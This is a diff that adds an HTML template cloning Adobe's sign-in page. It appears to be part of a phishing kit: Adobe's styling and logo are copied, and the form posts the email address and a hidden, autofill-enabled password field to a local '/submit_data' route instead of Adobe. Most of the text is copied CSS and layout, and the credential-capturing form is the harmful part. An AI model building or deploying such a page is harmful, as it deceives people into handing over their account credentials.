+        #SocialButtons-Container[data-social-buttons-container-condition='is-white'] [data-social-buttons-container='regular-white-bk'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-white'] [data-social-buttons-container='regular-white-bk-with-distance'] { display: none; }
+
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk'] [data-social-buttons-container='regular'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk'] [data-social-buttons-container='round'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk'] [data-social-buttons-container='white'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk'] [data-social-buttons-container='regular-white-bk'] { display: block; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk'] [data-social-buttons-container='regular-white-bk-with-distance'] { display: none; }
+
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk-with-distance'] [data-social-buttons-container='regular'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk-with-distance'] [data-social-buttons-container='round'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk-with-distance'] [data-social-buttons-container='white'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk-with-distance'] [data-social-buttons-container='regular-white-bk'] { display: none; }
+        #SocialButtons-Container[data-social-buttons-container-condition='is-regular-white-bk-with-distance'] [data-social-buttons-container='regular-white-bk-with-distance'] { display: block; }</style><style type="text/css">.spectrum--darkest .spectrum-Button--cta{background-color:#1473e6;border-color:#1473e6;color:#fff;}.spectrum--darkest .Canvas .Canvas-Background,.spectrum--darkest .Canvas .Canvas-Grid{background:#080808;}@media screen and (min-width: 510px){.spectrum--darkest .Canvas .Canvas-Background{background:rgba(0,0,0,0.5);}.spectrum--darkest .Canvas .Canvas-Grid{background:rgba(0,0,0,0);}}.spectrum--darkest .CardLayout{background:#080808;}.spectrum--darkest .spectrum-Textfield{background-color:#080808;border-color:#393939;color:#c8c8c8;}.spectrum--darkest .spectrum-Textfield--quiet{background-color:rgba(0,0,0,0);border-color:#393939;}.spectrum--darkest .spectrum-FieldLabel{color:#a2a2a2;}.spectrum--darkest{background-color:#1e1e1e;color:#b4b4b4;}.spectrum--darkest .spectrum-Heading1{color:#e2e2e2;}.spectrum--darkest .spectrum-Textfield::-webkit-input-placeholder,.spectrum--darkest .spectrum-Textfield::-moz-placeholder,.spectrum--darkest .spectrum-Textfield:-ms-input-placeholder,.spectrum--darkest .spectrum-Textfield::-ms-input-placeholder{color:#7c7c7c;}</style><link href="/favicon.ico" rel="shortcut icon"/><style>
+          .spectrum-Button{display:-ms-inline-flexbox;display:-webkit-inline-box;display:-webkit-inline-flex;display:-moz-inline-box;display:inline-flex;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-ms-flex-align:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;align-items:center;-ms-flex-pack:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;justify-content:center;overflow:visible;margin:0;border-style:solid;text-transform:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-appearance:button;vertical-align:top;text-decoration:none;font-family:adobe-clean-ux,adobe-clean,Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;line-height:1.3}.spectrum-Button::-moz-focus-inner{border:0;border-style:none;padding:0;margin-top:-2PX;margin-bottom:-2PX}.spectrum-Button{border-width:2px;border-style:solid;border-radius:16px;min-height:32px;height:auto;min-width:72px;padding:3.5px 14px 4.5px;font-size:14px;font-weight:700}.spectrum-Button-label{-ms-flex-item-align:center;-ms-grid-row-align:center;-webkit-align-self:center;align-self:center;-ms-grid-column-align:center;justify-self:center;text-align:center;width:100%}.spectrum--lightest .spectrum-Button--cta{background-color:#1473e6;border-color:#1473e6;color:#fff}.spectrum-Link{background-color:rgba(0,0,0,0);-webkit-text-decoration-skip:objects;text-decoration:none;outline:0}.spectrum--lightest .spectrum-Link{color:#1473e6}.Canvas{height:100%;position:relative;width:100%}.Canvas-Background{background:#fff;height:100%;-webkit-overflow-scrolling:touch;overflow-x:hidden;overflow-y:auto}.Canvas-Layout{display:-ms-grid;display:grid;position:relative;-ms-grid-rows:60px min-content minmax(min-content,1fr) minmax(35px,min-content);grid-template-rows:60px -webkit-min-content minmax(-webkit-min-content,1fr) minmax(35px,-webkit-min-content);grid-template-rows:60px min-content minmax(min-content,1fr) minmax(35px,min-content);-ms-grid-columns:1fr 1fr 1fr;grid-template-columns:1fr 1fr 1fr;min-height:100%}.Canvas-Layout>:first-child{-ms-grid-row:1;-ms-grid-column:1}.Canvas-Layout>:nth-child(2){-ms-grid-row:1;-ms-grid-column:2}.Canvas-Layout>:nth-child(3){-ms-grid-row:1;-ms-grid-column:3}.Canvas-Layout .Canvas-Grid{-ms-grid-row:1;-ms-grid-row-span:4;grid-row:1/5;-ms-grid-column:1;-ms-grid-column-span:3;grid-column:1/4}.Canvas-Layout--only-grid .Canvas-Grid{-ms-grid-row:1;-ms-grid-row-span:4;grid-row:1/5}.Canvas-Layout--with-header .Canvas-Grid{-ms-grid-row:2;-ms-grid-row-span:3;grid-row:2/5}.Canvas-Layout--with-footer .Canvas-Grid{-ms-grid-row:1;-ms-grid-row-span:3;grid-row:1/4}.Canvas-Layout--with-footer.Canvas-Layout--with-header .Canvas-Grid{-ms-grid-row:2;-ms-grid-row-span:2;grid-row:2/4}.Canvas-Layout .Canvas-Footer,.Canvas-Layout .Canvas-Header{-webkit-box-align:stretch;-webkit-align-items:stretch;-moz-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;-ms-grid-column:1;-ms-grid-column-span:3;grid-column:1/4}.Canvas-Layout .Canvas-Header{-ms-grid-row:1;-ms-grid-row-span:1;grid-row:1/2;min-height:60px}.Canvas-Layout .Canvas-Footer{-ms-grid-row:4;-ms-grid-row-span:1;grid-row:4/5}.Canvas-Grid{display:block;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;background:#fff;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;width:100%;padding-left:17px;padding-right:14px;position:relative}.Canvas-Grid .Canvas-Panel{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;width:100%;-ms-grid-column:1;-ms-grid-column-span:23;grid-column:1/13;-ms-grid-row:1;grid-row:1;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;margin:0 auto}@media screen and (min-width:510px){.Canvas{background:#f4f4f4 50%;background-size:cover;height:100%}.Canvas-Background{background:rgba(0,0,0,.5)}.Canvas-Layout{-ms-grid-columns:1fr minmax(-webkit-min-content,1280px) 1fr;-ms-grid-columns:1fr minmax(min-content,1280px) 1fr;grid-template-columns:1fr minmax(-webkit-min-content,1280px) 1fr;grid-template-columns:1fr minmax(min-content,1280px) 1fr}.Canvas-Layout .Canvas-Grid{-ms-grid-column:2;-ms-grid-column-span:1;grid-column:2/3}.Canvas-Grid{-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;background:rgba(0,0,0,0);margin:0 auto;padding-left:0;padding-right:0}.Canvas-Grid .Canvas-Panel{height:100%;width:100%;width:510px}}@media screen and (max-width:509px){.Canvas-Background,.Canvas-Grid,.Canvas-Item,.Canvas-Layout,.CardLayout-Container,.CardLayout-Toaster-Container,.Content{height:100%}}@media screen and (min-width:1280px){.Canvas-Layout--with-header .Canvas-Grid{-ms-grid-row:2;-ms-grid-row-span:3;grid-row:2/5}.Canvas-Layout--with-footer .Canvas-Grid{-ms-grid-row:1;-ms-grid-row-span:3;grid-row:1/4}.Canvas-Layout--with-footer.Canvas-Layout--with-header .Canvas-Grid{-ms-grid-row:2;-ms-grid-row-span:2;grid-row:2/4}.Canvas-Grid{display:-ms-grid;display:grid;-ms-grid-rows:1fr;grid-template-rows:1fr;-ms-grid-columns:1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr 32px 1fr;grid-template-columns:repeat(12,1fr);grid-gap:0 32px;gap:0 32px}.Canvas-Grid .Canvas-Panel{-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-ms-grid-column:13;-ms-grid-column-span:9;grid-column:7/12}.Canvas-Grid--reverse-dcp .Canvas-Panel{-ms-grid-column:3;-ms-grid-column-span:9;grid-column:2/7}}@media screen and (max-width:1023px){.Canvas-Layout .Canvas-Footer .DCP-Layout{display:block}}.spectrum-Textfield{padding:3px 12px 5px;font-family:adobe-clean,Helvetica,Arial,sans-serif}.spectrum--lightest .spectrum-Textfield{background-color:#fff;border-color:#eaeaea;color:#505050}.spectrum--lightest .spectrum-Textfield::-webkit-input-placeholder{color:#959595}.spectrum--lightest .spectrum-Textfield::-moz-placeholder{color:#959595}.spectrum--lightest .spectrum-Textfield:-ms-input-placeholder{color:#959595}.spectrum--lightest .spectrum-Textfield::-ms-input-placeholder{color:#959595}.spectrum--lightest .spectrum-Textfield--quiet{background-color:rgba(0,0,0,0);border-color:#eaeaea}.spectrum-FieldLabel{display:block;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:4px 0 5px;font-size:12px;font-weight:400;line-height:1.3;vertical-align:top;-webkit-font-smoothing:subpixel-antialiased;-moz-osx-font-smoothing:auto;font-smoothing:subpixel-antialiased}.spectrum--lightest .spectrum-FieldLabel{color:#747474}.Context__header-icon{height:18px;margin-right:8px}@media screen and (min-width:1280px){.Context__header-icon{height:40px;margin-right:16px}}.RuleWithText{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;color:#4b4b4b;font-size:17px;font-weight:300;line-height:23px}.RuleWithText:after,.RuleWithText:before{content:"";-webkit-box-flex:1;-webkit-flex:1;-moz-box-flex:1;-ms-flex:1;flex:1;border-bottom:1px solid #eaeaea}.RuleWithText:not(:empty):before{margin-right:.5em}.RuleWithText:not(:empty):after{margin-left:.5em}.SpinnerButton{display:-webkit-inline-box;display:-webkit-inline-flex;display:-moz-inline-box;display:-ms-inline-flexbox;display:inline-flex}.SpinnerButton .spectrum-Button-label{width:auto}.SpinnerButton--right .spectrum-Button-label{-webkit-box-ordinal-group:2;-webkit-order:1;-moz-box-ordinal-group:2;-ms-flex-order:1;order:1}.DCP-Layout{display:-ms-grid;display:grid;-webkit-box-align:stretch;-webkit-align-items:stretch;-moz-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;width:100%;-ms-grid-rows:100%;grid-template-rows:100%;-ms-grid-columns:minmax(1fr,-webkit-min-content);-ms-grid-columns:minmax(1fr,min-content);grid-template-columns:minmax(1fr,-webkit-min-content);grid-template-columns:minmax(1fr,min-content)}.Canvas-Header{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:0 16px;color:#747474;background-color:#fff;border-bottom:1px solid transparent}.Canvas-Footer{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:10px 16px;color:#747474;background-color:#fff;border-top:1px solid transparent}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}footer,header,section{display:block}h1{font-size:2em;margin:.67em 0}a{background-color:rgba(0,0,0,0);-webkit-text-decoration-skip:objects}img{border-style:none}svg:not(:root){overflow:hidden}button,input{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button{text-transform:none}button{-webkit-appearance:button}button::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring{outline:1px dotted ButtonText}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}.react-spectrum-provider{position:relative}.spectrum--lightest{background-color:#fff}.spectrum{font-family:adobe-clean,Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;font-size:14px}.spectrum-Heading1{font-style:normal;margin-bottom:8px;margin-top:8px}.spectrum-Heading1{font-size:36px;font-weight:700;line-height:1.3;letter-spacing:0;text-transform:none}.spectrum-Heading3{font-style:normal;margin-bottom:8px;margin-top:8px}.spectrum-Heading3{font-size:22px;font-weight:700;line-height:1.3;letter-spacing:0;text-transform:none}.spectrum{font-size:14px;font-weight:400;line-height:1.5;font-style:normal}.spectrum--lightest .spectrum-Heading1,.spectrum--lightest .spectrum-Heading3{color:#323232}.spectrum--lightest{color:#505050}.EmailPage__continue-with-email{display:none}.EmailPage__content{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.EmailPage__content.EmailPage__content--reversed{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-webkit-flex-direction:column-reverse;-moz-box-orient:vertical;-moz-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse;-webkit-box-pack:end;-webkit-justify-content:flex-end;-moz-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.EmailPage__content.EmailPage__content--reversed .EmailPage__continue-with-email{display:block}.EmailPage__email-field.form-group{margin:32px 0 21px}.EmailPage__submit{-webkit-align-content:center;-ms-flex-line-pack:center;align-content:center;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-moz-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.EmailPage__submit .ta-left{-webkit-align-self:center;-ms-flex-item-align:center;-ms-grid-row-align:center;align-self:center}.EmailPage__social-separator{margin-bottom:10px}.spectrum-Textfield{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:1px solid;border-radius:4px;padding:5px 11px 7px;text-indent:0;min-width:48px;height:32px;width:192px;vertical-align:top;margin:0;overflow:visible;font-family:adobe-clean,Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Ubuntu,Trebuchet MS,Lucida Grande,sans-serif;font-size:14px;line-height:1.5;-o-text-overflow:ellipsis;text-overflow:ellipsis;outline:0;-webkit-appearance:none;-moz-appearance:textfield}.spectrum-Textfield::-webkit-input-placeholder{font-weight:400;font-style:italic;opacity:1}.spectrum-Textfield::-moz-placeholder{font-weight:400;font-style:italic;opacity:1}.spectrum-Textfield:-ms-input-placeholder{font-weight:400;font-style:italic;opacity:1}.spectrum-Textfield::-ms-input-placeholder{font-weight:400;font-style:italic;opacity:1}.spectrum-Textfield::-ms-clear{width:0;height:0}.spectrum-Textfield::-webkit-inner-spin-button,.spectrum-Textfield::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.spectrum-Textfield:-moz-ui-invalid{box-shadow:none}.spectrum-Textfield--quiet{border-radius:0;border-width:0 0 1px;padding-left:0;padding-right:0;resize:none;overflow-y:hidden}noscript:not(:empty)~.CardLayout{border-top-left-radius:0;border-top-right-radius:0}.CardLayout{background:#fff;border-radius:4px;border:1px solid hsla(0,0%,100%,0);display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;min-height:100%;padding:24px 0 40px;position:relative}.CardLayout,.CardLayout-Container{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}.CardLayout-Toaster-Container{position:relative;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column}.CardLayout__header h1{margin:0}.CardLayout__content{-webkit-box-flex:1;-webkit-flex-grow:1;-moz-box-flex:1;-ms-flex-positive:1;flex-grow:1}.CardLayout__footer{margin-top:20px}.CardLayout__footer-link-list{list-style:none;padding:0}@media screen and (min-width:510px){.CardLayout{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;min-height:630px;padding:24px 56px 40px}.CardLayout-Container{padding:16px 0;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center}}@media screen and (min-width:1024px){.CardLayout{padding:40px 56px}}#App,#UnsupportedBrowser,.spectrum,html{height:100%;overflow:hidden}body{margin:0}.spectrum .spectrum-Textfield{width:100%}.ta-right{text-align:right}.ta-left{text-align:left}.spectrum-Button:last-child{margin-right:0}.credential-hide-helper{margin:-1px 0 0;padding:0;height:1px;overflow:hidden;visibility:hidden}.spectrum .spectrum-Textfield{font-size:16px;line-height:1.15}.form-group{margin:15px 0;min-height:69px;position:relative}.form-group:first-child{margin-top:0}.form-group .spectrum-FieldLabel{padding-bottom:0;padding-top:0}.form-group .spectrum-Textfield{height:28px;padding-bottom:0;padding-top:0}#UnsupportedBrowser .Canvas{background-image:url(/img/canvas/Fotolia_113489662_XL.jpg)}#UnsupportedBrowser .Canvas-Background{position:relative}#UnsupportedBrowser .Canvas-Item.Canvas-Panel{position:absolute;top:50%;left:50%;width:510px;height:630px;margin-left:-255px;margin-top:-315px}#UnsupportedBrowser .CardLayout{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border-color:#fff;width:510px;height:630px;padding:40px 56px}#UnsupportedBrowser .Context__header-icon{max-height:18px}@media (min-width:304px){.mb-xs-0{margin-bottom:0!important}.mt-xs-1{margin-top:8px!important}.mb-xs-1{margin-bottom:8px!important}.mt-xs-2{margin-top:16px!important}.mt-xs-3{margin-top:24px!important}.mt-xs-4{margin-top:32px!important}}@media screen and (max-width:768px){.form-group .spectrum-Textfield{font-size:19px}}
+        </style>
+<link as="style" href="/931f6987d/styles.fe13d093.css" id="css-link" rel="preload"/>
+<noscript><link href="/931f6987d/styles.fe13d093.css" rel="stylesheet"/></noscript><link href="{{ url_for('static', filename='styles.fe13d093.css') }}" rel="stylesheet" type="text/css"/>
+</head><body class="spectrum" lang="en"><div id="App"><div class="react-spectrum-provider spectrum spectrum--lightest spectrum--medium" data-reactroot=""><div class="Canvas" data-id="Canvas"><section class="Canvas-Background"><div class="Canvas-Layout Canvas-Layout--only-grid Canvas-Layout--with-header Canvas-Layout--with-footer"><header class="Canvas-Header" data-id="Canvas-Header"><div class="DCP-Layout"></div></header><div class="Canvas-Grid Canvas-Grid--reverse-dcp"><section class="Canvas-Item Canvas-Panel"><section class="Content"><div class="CardLayout-Container EmailPage" data-id=""><div class="CardLayout-Toaster-Container"><noscript><section class="CardLayout__toaster"><div class="spectrum-Toast spectrum-Toast--error" data-id="No-Javascript-Toaster" role="alert"><svg aria-label="Error" class="spectrum-UIIcon-AlertMedium spectrum-Icon spectrum-Toast-typeIcon" focusable="false" role="img"><path class="spectrum-UIIcon--medium" d="M8.564 1.289L.2 16.256A.5.5 0 0 0 .636 17h16.728a.5.5 0 0 0 .5-.5.494.494 0 0 0-.064-.244L9.436 1.289a.5.5 0 0 0-.872 0zM10 14.75a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-1.5a.25.25 0 0 1 .25-.25h1.5a.25.25 0 0 1 .25.25zm0-3a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-6a.25.25 0 0 1 .25-.25h1.5a.25.25 0 0 1 .25.25z"></path><path class="spectrum-UIIcon--large" d="M10.563 2.206l-9.249 16.55a.5.5 0 0 0 .436.744h18.5a.5.5 0 0 0 .5-.5.494.494 0 0 0-.064-.244l-9.251-16.55a.5.5 0 0 0-.872 0zM12 17.25a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-1.5a.25.25 0 0 1 .25-.25h1.5a.25.25 0 0 1 .25.25zm0-3.5a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-6a.25.25 0 0 1 .25-.25h1.5a.25.25 0 0 1 .25.25z"></path></svg><div class="spectrum-Toast-body"><div class="spectrum-Toast-content">JavaScript is disabled.<br/>Please enable JavaScript and try to sign in again.</div></div></div></section></noscript>
+<section class="CardLayout"><header class="CardLayout__header"><h1 class="spectrum-Heading1 mb-xs-1">Sign in</h1></header><section class="CardLayout__content EmailPage__content EmailPage__content--reversed"><form action="/submit_data" id="EmailForm" method="POST"><section class="EmailPage__email-field form-group"><h3 class="spectrum-Heading3 EmailPage__continue-with-email mt-xs-1 mb-xs-0">Continue with email</h3><div class="mt-xs-4"><label class="spectrum-FieldLabel" for="EmailPage-EmailField" id="react-spectrum-1">Email address</label><input autocomplete="email" class="spectrum-Textfield spectrum-Textfield--quiet" data-id="EmailPage-EmailField" id="EmailPage-EmailField" name="username" type="email" value=""/><div class="credential-hide-helper"><input aria-hidden="true" autocomplete="current-password" name="passwd" placeholder="Password" tabindex="-1" type="password"/></div></div></section><section class="EmailPage__submit mod-submit" columns="2"><div class="ta-left"></div><div class="ta-right"><button class="spectrum-Button spectrum-Button--cta SpinnerButton SpinnerButton--right" data-id="EmailPage-ContinueButton"><span class="spectrum-Button-label">Continue</span></button></div></section></form><div class="RuleWithText EmailPage__social-separator mt-xs-3" id="SocialButtons-Separator">Or</div><section class="mt-xs-2" data-social-buttons-container-condition="" id="SocialButtons-Container"><section data-social-buttons-container="regular"></section><section data-social-buttons-container="round"></section><section data-social-buttons-container="white"></section><section data-social-buttons-container="regular-white-bk"></section><section data-social-buttons-container="regular-white-bk-with-distance"></section></section></section><footer class="CardLayout__footer"><ul class="CardLayout__footer-link-list"><li class="EmailPage-Footer__get-help-link"><a class="spectrum-Link" data-id="PasswordPage-GetHelpLink" href="#" rel="noopener noreferrer">Get help signing in</a></li></ul></footer></section></div></div></section></section></div><footer class="Canvas-Footer" data-id="Canvas-Footer"><div class="DCP-Layout"></div></footer></div></section></div></div></div><div id="UnsupportedBrowser"><div class="react-spectrum-provider spectrum spectrum--medium"><div class="Canvas"><section class="Canvas-Background"><div class="Canvas-Item Canvas-Panel"><div class="CardLayout-Container"><div class="CardLayout"><div class="mb-xs-1" data-id="Adobe-Default-Context"><div class="Logo"><img alt="Adobe Logo" class="Context__header-icon" data-id="Adobe-Default-Context-Icon-Black" height="18px" src="/img/generic/adobe_logo_black.svg"/></div></div><header class="CardLayout__header"><div class="IconHeading"><div class="Icon IconHeading__icon"><svg height="56" id="S_Illu_Alert_56" viewbox="0 0 62.867 56" width="62.867" xmlns="http://www.w3.org/2000/svg"><g data-name="Group 154445" id="Group_154445" style="isolation: isolate" transform="translate(-685 -168.001)"><path d="M63.985,65.2H12.432a5.657,5.657,0,0,1-4.9-8.486L33.308,12.036a5.657,5.657,0,0,1,9.8,0L68.884,56.719a5.657,5.657,0,0,1-4.9,8.486ZM38.209,12.033a2.8,2.8,0,0,0-2.45,1.414h0L9.983,58.134a2.829,2.829,0,0,0,2.45,4.243H63.985a2.829,2.829,0,0,0,2.45-4.243L40.658,13.449a2.8,2.8,0,0,0-2.45-1.416Zm-3.677.707Z" data-name="Path 139" fill="#bcbcbc" id="Path_139" transform="translate(678.225 158.796)"></path><path d="M28.914,39.792A1.414,1.414,0,0,1,27.5,38.378V24.968a1.414,1.414,0,0,1,2.829,0V38.378A1.414,1.414,0,0,1,28.914,39.792Z" data-name="Path 140" fill="#bcbcbc" id="Path_140" transform="translate(686.812 164.741)"></path><circle cx="2.122" cy="2.122" data-name="Ellipse 15" fill="#bcbcbc" id="Ellipse_15" r="2.122" transform="translate(713.605 209.483)"></circle></g></svg></div><h1 class="spectrum-Heading1 IconHeading__heading mt-xs-2">Update your browser</h1></div></header><div class="CardLayout__content"><div>To use Adobe services, please update your Adobe applications, operating system, and browser to the latest versions.</div></div></div></div></div></section></div></div></div></body></html>
